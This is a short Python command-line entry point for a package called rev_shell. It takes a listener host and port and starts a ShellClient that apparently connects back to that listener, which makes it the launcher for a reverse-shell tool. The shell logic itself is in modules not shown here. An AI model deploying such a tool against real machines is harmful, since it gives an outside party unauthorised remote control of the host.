import click

from rev_shell.client import ShellClient
from rev_shell.config import ShellConfig
from rev_shell.logger import setup_logger


@click.command()
@click.option('--host', help='Listener IP.')
@click.option('--port', type=int, help='Listener Port.')
@click.option('--log', help='Path to log file.')
def main(**kwargs):
    clean_args = {k: v for k, v in kwargs.items() if v is not None}

    try:
        config = ShellConfig(**clean_args)
        logger = setup_logger(config.log_file)
        client = ShellClient(config, logger)
        client.start()
    except Exception as e:
        click.secho(f'Configuration Error: {e}', fg='red')


if __name__ == '__main__':
    main()
